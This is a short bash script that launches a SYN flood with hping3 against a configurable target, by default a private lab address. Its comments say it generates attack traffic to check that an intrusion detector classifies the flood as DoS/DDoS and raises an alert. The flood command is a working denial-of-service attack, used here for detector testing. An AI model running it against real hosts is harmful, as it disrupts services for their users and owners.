#!/usr/bin/env bash
# SYN flood -> DoS/DDoS family. Tiny all-SYN packets at high rate.
# Expected: detector sees high Rate + syn_flag_number ~1, classifies DoS/DDoS,
# and alerts on this source within ~2 windows (a few hundred ms of flood).
set -euo pipefail
TARGET="${TARGET:-172.30.0.10}"
PORT="${PORT:-80}"
DURATION="${DURATION:-15}"   # seconds; 0 = run until Ctrl-C

echo "[synflood] SYN flood -> ${TARGET}:${PORT} for ${DURATION}s"
if [ "${DURATION}" -gt 0 ]; then
  timeout "${DURATION}" hping3 -S --flood -p "${PORT}" "${TARGET}" || true
else
  hping3 -S --flood -p "${PORT}" "${TARGET}"
fi
echo "[synflood] done"
